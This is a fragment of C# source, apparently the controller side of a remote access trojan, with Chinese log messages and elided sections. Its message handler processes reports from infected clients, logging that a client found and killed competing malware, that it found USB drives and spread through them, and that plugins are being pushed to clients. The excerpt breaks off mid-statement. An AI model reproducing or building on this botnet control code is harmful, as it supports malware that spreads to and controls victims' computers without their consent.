                        ...
                        case "Logs":
                            {
                                ...
                                new HandleLogs().Addmsg($"客户端 {client.Ip} {unpack_msgpack.ForcePathObject("消息框").AsString}", Color.Black);
                                break;
                            }
                        ...
                        case "BotKiller":
                            {
                                ...
                                new HandleLogs().Addmsg($"客户端 {client.Ip} 发现 {unpack_msgpack.ForcePathObject("Count").AsString} 恶意软件并成功地杀死它们", Color.Orange);
                                break;
                            }
                        ...
                        case "usb":
                            {
                                ...
                                new HandleLogs().Addmsg($"客户端 {client.Ip} 发现 {unpack_msgpack.ForcePathObject("Count").AsString} USB并成功传播", Color.Purple);
                                break;
                            }
                        ...
                        case "Error":
                            {
                                ...
                                new HandleLogs().Addmsg($"客户端 {client.Ip} 错误: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
                        ...
                        case "sendPlugin":
                            {
                                ...
                                new HandleLogs().Addmsg($"将插件发送到客户端 {client.Ip} 第一次请稍等..", Color.Blue);
                                ThreadPool.QueueUserWorkItem(delegate {
